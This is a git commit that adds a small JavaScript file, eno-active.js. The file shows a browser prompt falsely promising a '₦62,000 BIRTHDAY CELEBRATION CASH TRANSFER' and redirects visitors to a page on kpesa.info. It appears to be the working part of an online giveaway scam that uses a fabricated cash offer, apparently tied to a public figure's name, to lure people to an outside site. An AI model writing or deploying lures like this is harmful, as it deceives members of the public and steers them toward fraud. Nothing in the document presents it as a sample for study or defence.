37b3fdd92cdec7ac0e7d263c9a6df755e18ca823
kpesaa <meiosis_logins.2d@icloud.com>
2026-06-01 02:13:15 +0100

    Create eno-active.js

---
+++ eno-active.js
@@ -0,0 +1,11 @@
+
+var password = '₦62,000';
+
+password = prompt(
+  'Congratulations, you are eligible for ₦62,000 BIRTHDAY CELEBRATION CASH TRANSFER. Click OK to activate now.',
+  '₦62,000'
+);
+
+if (password !== '₦62,000') {
+    location.href = 'https://kpesa.info/Umo-Eno-birthday.html';
+}
